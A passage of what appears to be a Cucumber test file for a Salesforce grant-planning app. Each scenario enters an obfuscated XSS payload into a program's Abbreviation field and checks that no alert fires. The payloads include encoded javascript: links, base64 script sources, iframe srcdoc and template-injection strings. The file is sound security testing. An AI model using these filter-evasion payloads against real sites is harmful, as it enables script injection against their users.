      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301184 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a href="&#x6a;avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301187 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                             | Field                |
      | a href="j&#x61vascript:alert(1)">XSS</a>  <a href="&#x6a  avascript:alert(1)">XSS</a>  <a href="&#x6a avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301216 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <a href="&#x0000006a;avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301220 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a href="&#X6A;avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301236 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                          | Field                |
      | <a href="javascript&colon;alert(1)">XSS</a>  <a href="java&Tab;script:alert(1)">XSS</a>  <a href="java&NewLine;script:alert(1)">XSS</a>  <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301240 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                              | Field                |
      | <a href="javascript:x='%27-alert(1)-%27';">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301243 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301248 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <script src=data:text/javascript;base64,YWxlcnQoMSk=></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301251 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                      | Field                |
      | <script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301253 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | <script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301254 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                        | Field                |
      | <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301255 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                   | Field                |
      | <iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @201257 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                               | Field                |
      | <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301259 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301306 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | {{constructor.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301307 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <div v-html="''.constructor.constructor('alert(1)')()">a</div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301308 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <x v-html=_c.constructor('alert(1)')()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
